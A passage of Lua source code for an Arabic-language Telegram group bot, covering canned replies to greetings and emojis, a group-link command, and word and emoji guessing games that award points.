hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم حفظ كليشه المطور ", 1, "md")
end
end 
if text and text:match("^(.*)$") then
local hxouse = hxousedx1:get('hxouse:'..bot_id..'namebot'..msg.sender_user_id_..'')
if hxouse == 'msg' then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم حفظ الاسم ', 1, 'html')
hxousedx1:set('hxouse:'..bot_id..'namebot'..msg.sender_user_id_..'', 'no')
hxousedx1:set('hxouse:'..bot_id..'name_bot', text)
return false 
end
end
----------------------------------------HXOUSE TEAM---------------------------------------------------------------
if hxousedx1:get(HXOUSE..'bot:cmds'..msg.chat_id_) and not is_momod(msg.sender_user_id_, msg.chat_id_) then
print("Return False [Lock] [Cmd]")

else  
--------------------------------------hxouse
if text:match("^Ll]ink$") or text:match("^الرابط$") and hxouse11(msg) then
if not hxousedx1:get(HXOUSE.."bot:tt:link:"..msg.chat_id_) then 
local link = hxousedx1:get(HXOUSE.."bot:group:link"..msg.chat_id_)
if link then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙رابط مجموعه "..title_name(msg.chat_id_).."\n⌯︙" .. link, 1, "html")
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙*رابط المجموعه* 🛒\n⌯︙~ *{ • "..title_name(msg.chat_id_).." • }* ~\n⌯︙:- " .. link, 1, "md")
end
else 
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Group link is not set ! \n Plese send command Setlink and set it  ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لم يتم حفظ رابط المجموعه ارسل لي (ضع رابط) ليتم حفظه 📥', 1, 'md')
end
end
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙الرابط معطل لا يمكن ارساله', 1, 'md')
end
end
end 
if text == 'دي' or text == 'دي لك' then 
if not hxousedx1:get(HXOUSE..'bot:rep:mute'..msg.chat_id_) then
hxouse =  "اخلاقك لعار"
else 
hxouse = ''
end
hxousedx(msg.chat_id_, msg.id_, 1, hxouse, 1, 'md')
end
if text == 'سلام' or text == 'السلام عليكم' or text == 'سلام عليكم' then 
if not hxousedx1:get(HXOUSE..'bot:rep:mute'..msg.chat_id_) then
hxouse =  "اطلقق سلام"
else 
hxouse = ''
end
hxousedx(msg.chat_id_, msg.id_, 1, hxouse, 1, 'md')
end
if text == '😭💔' or text == '😭😭' or text == '😭😭😭' or text == '😿💔' or text == '😭' or text == '😭😭😭' or text == '😭😭😭😭' then      
if not hxousedx1:get(HXOUSE..'bot:rep:mute'..msg.chat_id_) then
hxouse =  "وف جععلني لدموعع"
else 
hxouse = ''
end 
hxousedx(msg.chat_id_, msg.id_, 1, hxouse, 1, 'md')
end
if text == '🌚💔' or text == '💔🌚' or text == '🚶‍♂💔' or text == '💔' or text == '😔💔' or text == '🚶‍♀💔' or text == '😭' then      
if not hxousedx1:get(HXOUSE..'bot:rep:mute'..msg.chat_id_) then
hxouse =  "شبكك يكيكوت ۦ"
else 
hxouse = ''
end 
hxousedx(msg.chat_id_, msg.id_, 1, hxouse, 1, 'md')
end
if text == 'باي' or text == 'بااي' or text == 'اروح' or text == 'اروح احسن' or text == 'اولي احسن' or text == 'راح اروح' or text == 'باي انام' then      
if not hxousedx1:get(HXOUSE..'bot:rep:mute'..msg.chat_id_) then
hxouse =  "اموتنن غير"
else 
hxouse = ''
end
hxousedx(msg.chat_id_, msg.id_, 1, hxouse, 1, 'md')
end
if text == 'هلو' or text == 'هلاو' or text == 'هلا' or text == 'هلاوو' or text == 'هيلاو' or text == 'هيلاوو' or text == 'هلاا' then      
if not hxousedx1:get(HXOUSE..'bot:rep:mute'..msg.chat_id_) then
hxouse =  "اطلقق ههلاو"
else 
hxouse = ''
end 
hxousedx(msg.chat_id_, msg.id_, 1, hxouse, 1, 'md')
end
if text == 'شونك' or text == 'شونج' or text == 'شلونك' or text == 'شلونج' or text == 'شونكم' or text == 'شلونكم' or text == 'شلخبار' then      
if not hxousedx1:get(HXOUSE..'bot:rep:mute'..msg.chat_id_) then
hxouse =  "ماشيهه يعمري ونتا"
else 
hxouse = ''
end 
hxousedx(msg.chat_id_, msg.id_, 1, hxouse, 1, 'md')
end
if text == 'وينك' or text == 'وينج' then 
if not hxousedx1:get(HXOUSE..'bot:rep:mute'..msg.chat_id_) then
hxouse =  "موجود يمك يحلو"
else 
hxouse = ''
end 
hxousedx(msg.chat_id_, msg.id_, 1, hxouse, 1, 'md')
end
if text == 'نايمين' or text == 'ميتين' then 
if not hxousedx1:get(HXOUSE..'bot:rep:mute'..msg.chat_id_) then
hxouse =  "طامسينن وعيونككۦ"
else 
hxouse = ''
end 
hxousedx(msg.chat_id_, msg.id_, 1, hxouse, 1, 'md')
end
if text == 'اكلك' or text == 'اكلج' then 
if not hxousedx1:get(HXOUSE..'bot:rep:mute'..msg.chat_id_) then
hxouse =  "ཻاٰ̲ھہﯛ૭ ب̲ꪰـﮧدٰتـٰۧﮧ ཻالٍُـّٰ̐ہكـِّﮧْٰٖرٰཻاﯛ૭يـِٰ̲ﮧ ཻالٍُـّٰ̐ہتـٰۧﮧعـ͜ާﮧْب̲ꪰـﮧཻانٰ̲̐ـﮧْٰ̲ھہ 卍🙃♛⁽ ֆ ̯͡“"
else 
hxouse = ''
end 
hxousedx(msg.chat_id_, msg.id_, 1, hxouse, 1, 'md')
end
if text == 'ها' or text == 'هاا' then 
if not hxousedx1:get(HXOUSE..'bot:rep:mute'..msg.chat_id_) then
hxouse =  "ۿۿہآ رديِٰـﮧِۢنِٰـﮧِۢۿۿہ لِٰـِﮧۢﯛ̲୭ لِٰـِﮧۢآ ₎⇣🌚🔥 ┇₎⇣"
else 
hxouse = ''
end
hxousedx(msg.chat_id_, msg.id_, 1, hxouse, 1, 'md')
end
if text == 'سورس فايدر' or text == 'هذا سورس فايدر' then 
if not hxousedx1:get(HXOUSE..'bot:rep:mute'..msg.chat_id_) then
hxouse =  "لآ سٰٰٓوِرسٰٰٓ خٰ̐ہآلتَہَٰڪٰྀہٰٰٖ ديِٰہ لڪٰྀہٰٰٖ ┋՞❁ 🌞?? ﴾"
else 
hxouse = ''
end
hxousedx(msg.chat_id_, msg.id_, 1, hxouse, 1, 'md')
end 
if text == 'بوت' and hxouse11(msg) then 
name_bot = (hxousedx1:get('hxouse:'..bot_id..'name_bot') or 'فايدر') 
local hxouse = {
 "اسمي "..name_bot.." 😒🔪 لتكول بوت"
}
hxouse2 = math.random(#hxouse)
hxousedx(msg.chat_id_, msg.id_, 1, hxouse[hxouse2] , 1, 'md') 
end
if (text and text == (hxousedx1:get('hxouse:'..bot_id..'name_bot') or 'فايدر')) then
name_bot = (hxousedx1:get('hxouse:'..bot_id..'name_bot') or 'فايدر')
local namebot = { 
 'نعم حبي وياك '..name_bot..' كول شرايد 🌚❤️'
}
name = math.random(#namebot)
hxousedx(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'md') 
return false end
if text =='نقاطي' and hxouse11(msg) then 
if tonumber((hxousedx1:get(HXOUSE..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
hxouse0 = '⌯︙ ليس لديك نقاط العب اولا \n⌯︙ للعب ارسل { الالعاب } '
hxousedx(msg.chat_id_, msg.id_, 1,hxouse0, 1, 'md')
else 
hxouse = '⌯︙ لديك ('..(hxousedx1:get(HXOUSE..'bot:add:num'..msg.chat_id_..msg.sender_user_id_))..') نقطه '
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md')
end
end
if text ==  'مسح رسائلي' and hxouse11(msg) then
hxousedx1:del('hxouse:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم مسح رسائلك المضافه ', 1, 'md')
end
if text == 'سمايلات' and hxousedx1:get(HXOUSE..'bot:lock_geam'..msg.chat_id_) then
hxousedx1:del(HXOUSE..'bot:l:ids'..msg.chat_id_)
hxouse2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🧼','🎻','🎸','??','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','༯','🎗','🏵','🎖','🧼','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','༯','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = hxouse2[math.random(#hxouse2)]
hxousedx1:set(HXOUSE..'bot:klmos'..msg.chat_id_,name)
name = string.gsub(name,'🍞','🍞')
name = string.gsub(name,'🥖','🥖')
name = string.gsub(name,'🥨','🥨')
name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚')
name = string.gsub(name,'🍳','🍳')
name = string.gsub(name,'🥞','🥞')
name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩')
name = string.gsub(name,'🍗','🍗')
name = string.gsub(name,'🍖','🍖')
name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔')
name = string.gsub(name,'🍟','🍟')
name = string.gsub(name,'🍕','🍕')
name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙')
name = string.gsub(name,'🍼','🍼')
name = string.gsub(name,'☕️','☕️')
name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤')
name = string.gsub(name,'🍶','🍶')
name = string.gsub(name,'🍺','🍺')
name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎')
name = string.gsub(name,'🍐','🍐')
name = string.gsub(name,'🍊','🍊')
name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌')
name = string.gsub(name,'🍉','🍉')
name = string.gsub(name,'🍇','🍇')
name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈')
name = string.gsub(name,'🍒','🍒')
name = string.gsub(name,'🍑','🍑')
name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥')
name = string.gsub(name,'🥝','🥝')
name = string.gsub(name,'🍅','🍅')
name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑')
name = string.gsub(name,'🥦','🥦')
name = string.gsub(name,'🥒','🥒')
name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽')
name = string.gsub(name,'🥕','🥕')
name = string.gsub(name,'🥔','🥔')
name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐')
name = string.gsub(name,'🍻','🍻')
name = string.gsub(name,'🏀','🏀')
name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈')
name = string.gsub(name,'⚾️','⚾️')
name = string.gsub(name,'🎾','🎾')
name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉')
name = string.gsub(name,'🎱','🎱')
name = string.gsub(name,'🏓','🏓')
name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅')
name = string.gsub(name,'🎰','🎰')
name = string.gsub(name,'🎮','🎮')
name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯')
name = string.gsub(name,'🧼','🧼')
name = string.gsub(name,'🎻','🎻')
name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺')
name = string.gsub(name,'🥁','🥁')
name = string.gsub(name,'🎹','🎹')
name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧')
name = string.gsub(name,'🎤','🎤')
name = string.gsub(name,'🎬','🎬')
name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭')
name = string.gsub(name,'🎪','🎪')
name = string.gsub(name,'🛎','🛎')
name = string.gsub(name,'༯','༯')
name = string.gsub(name,'🎗','🎗')
name = string.gsub(name,'🏵','🏵')
name = string.gsub(name,'🎖','🎖')
name = string.gsub(name,'🧼','🧼')
name = string.gsub(name,'🥌','🥌')
name = string.gsub(name,'🛷','🛷')
name = string.gsub(name,'🚕','🚕')
name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙')
name = string.gsub(name,'🚌','🚌')
name = string.gsub(name,'🚎','🚎')
name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓')
name = string.gsub(name,'🚑','🚑')
name = string.gsub(name,'🚚','🚚')
name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜')
name = string.gsub(name,'🇮🇶','🇮🇶')
name = string.gsub(name,'⚔️','⚔️')
name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮')name = string.gsub(name,'🌡','🌡')
name = string.gsub(name,'💣','💣')
name = string.gsub(name,'⏱','⏱')
name = string.gsub(name,'༯','༯')
name = string.gsub(name,'📓','📒')
name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📂','༯')
name = string.gsub(name,'📅','📆')
name = string.gsub(name,'📪','📪')
name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬')
name = string.gsub(name,'📭','📭')
name = string.gsub(name,'⏰','⏰')
name = string.gsub(name,'📺','📺')
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
hxouse = '⌯︙ اول واحد يدز هذا السمايل  {'..name..'} يربح '
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md')
end
if text == ''..(hxousedx1:get(HXOUSE..'bot:klmos'..msg.chat_id_) or 'لفاتع')..'' and not hxousedx1:get(HXOUSE..'bot:l:ids'..msg.chat_id_) then
if not hxousedx1:get(HXOUSE..'bot:l:ids'..msg.chat_id_) then 
hxouse = '⌯︙ انت الرابح  \n⌯︙ للعب مره اخرى ارسل سمايلات '
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md')
hxousedx1:incrby(HXOUSE..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
hxousedx1:set(HXOUSE..'bot:l:ids'..msg.chat_id_,true)
end
if text == 'ترتيب' and hxousedx1:get(HXOUSE..'bot:lock_geam'..msg.chat_id_) and hxouse11(msg) then
hxousedx1:del(HXOUSE..'bot:l:id'..msg.chat_id_)
hxouse2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = hxouse2[math.random(#hxouse2)]
hxousedx1:set(HXOUSE..'bot:klmo'..msg.chat_id_,name)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
hxouse = '⌯︙ اول واحد يرتبها  {'..name..'} يربح '
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md')
end
if text == ''..(hxousedx1:get(HXOUSE..'bot:klmo'..msg.chat_id_) or 'لفاتع')..'' and not hxousedx1:get(HXOUSE..'bot:l:id'..msg.chat_id_) then
if not hxousedx1:get(HXOUSE..'bot:l:id'..msg.chat_id_) then 
hxouse = '⌯︙ انت الرابح  \n⌯︙ للعب مره اخرى ارسل ترتيب '
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md')
hxousedx1:incrby(HXOUSE..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
hxousedx1:set(HXOUSE..'bot:l:id'..msg.chat_id_,true)
end
if text == 'محيبس' or text == 'بات' or text == 'المحيبس' and hxousedx1:get(HXOUSE..'bot:lock_geam'..msg.chat_id_) and hxouse11(msg) then
Num = math.random(1,6)
hxousedx1:set(HXOUSE.."GAMES"..msg.chat_id_,Num) 
TEST = [[
*➀       ➁     ➂      ➃      ➄     ➅
↓      ↓     ↓      ↓     ↓     ↓
👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊


༯   اختر رقم يد لاستخراج المحيبس  
⌯︙ الفائز يحصل على { 5 } النقاط *
]]
hxousedx( msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
hxousedx1:setex(HXOUSE.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
if text == 'حزوره' and hxousedx1:get(HXOUSE..'bot:lock_geam'..msg.chat_id_) and hxouse11(msg) then
hxousedx1:del(HXOUSE..'bot:l:id'..msg.chat_id_)
hxouse2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = hxouse2[math.random(#hxouse2)]
hxousedx1:set(HXOUSE..'bot:bkbk'..msg.chat_id_,name)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
hxouse = '⌯︙ اول واحد يحلها  {'..name..'} يربح '
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md')
end
if text == ''..(hxousedx1:get(HXOUSE..'bot:bkbk'..msg.chat_id_) or 'لفاتع')..'' and not hxousedx1:get(HXOUSE..'bot:l:id'..msg.chat_id_) then
if not hxousedx1:get(HXOUSE..'bot:l:id'..msg.chat_id_) then 
hxouse = '⌯︙ انت الرابح  \n⌯︙ للعب مره اخرى ارسل حزوره '
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md')
hxousedx1:incrby(HXOUSE..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
hxousedx1:set(HXOUSE..'bot:l:id'..msg.chat_id_,true)
end 
if text == 'المعاني' and hxousedx1:get(HXOUSE..'bot:lock_geam'..msg.chat_id_) and hxouse11(msg) then
hxousedx1:del(HXOUSE..'bot:l:id'..msg.chat_id_)
hxouse2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = hxouse2[math.random(#hxouse2)]
hxousedx1:set(HXOUSE..'bot:bkbk2'..msg.chat_id_,name)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
hxouse = '⌯︙ ما معنى هذا السمايل ؟  {'..name..'} '
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md')
end
if text == ''..(hxousedx1:get(HXOUSE..'bot:bkbk2'..msg.chat_id_) or 'لفاتع')..'' and not hxousedx1:get(HXOUSE..'bot:l:id'..msg.chat_id_) then
if not hxousedx1:get(HXOUSE..'bot:l:id'..msg.chat_id_) then 
hxouse = '⌯︙ انت الرابح  \n⌯︙ للعب مره اخرى ارسل المعاني '
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md')
hxousedx1:incrby(HXOUSE..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
hxousedx1:set(HXOUSE..'bot:l:id'..msg.chat_id_,true)
end 
if text == 'العكس' and hxousedx1:get(HXOUSE..'bot:lock_geam'..msg.chat_id_) and hxouse11(msg) then
hxousedx1:del(HXOUSE..'bot:l:id'..msg.chat_id_)
hxouse2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = hxouse2[math.random(#hxouse2)]
hxousedx1:set(HXOUSE..'bot:bkbk3'..msg.chat_id_,name)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'موحلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'عدل','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
hxouse = '⌯︙ عكس كلمه ~ {'..name..'} '
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md')
end
if text == ''..(hxousedx1:get(HXOUSE..'bot:bkbk3'..msg.chat_id_) or 'لفاتع')..'' and not hxousedx1:get(HXOUSE..'bot:l:id'..msg.chat_id_) then
if not hxousedx1:get(HXOUSE..'bot:l:id'..msg.chat_id_) then 
hxouse = '⌯︙ انت الرابح  \n⌯︙ للعب مره اخرى ارسل العكس '
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md')
hxousedx1:incrby(HXOUSE..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
hxousedx1:set(HXOUSE..'bot:l:id'..msg.chat_id_,true)
end 
if text == 'المختلف' and hxousedx1:get(HXOUSE..'bot:lock_geam'..msg.chat_id_) and hxouse11(msg) then
hxousedx1:del(HXOUSE..'bot:l:id'..msg.chat_id_)
hxouse2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧜‍♂','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕒','🕤','⌛️','📅',
};
name = hxouse2[math.random(#hxouse2)]
hxousedx1:set(HXOUSE..'bot:bkbk4'..msg.chat_id_,name)
name = string.gsub(name,'😸','😹😹😹😹😹😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠','💀💀💀💀💀💀💀☠💀💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼👻👻👻👻👻')
name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚🌚')
name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟🌟🌟⭐️🌟🌟🌟')
name = string.gsub(name,'📥','💫💫💫💫💫📥💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨🌨🌨⛈🌨🌨🌨🌨')
name = string.gsub(name,'🌥','⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
